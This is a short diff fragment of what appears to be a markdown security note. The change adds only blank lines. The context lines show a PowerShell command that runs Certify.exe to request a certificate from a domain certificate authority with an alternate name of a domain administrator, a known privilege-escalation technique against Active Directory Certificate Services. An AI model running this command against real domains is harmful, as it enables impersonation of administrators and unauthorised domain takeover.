@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:09.239376+00:00'
 ```ps1
 .\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin
 ```
+
+
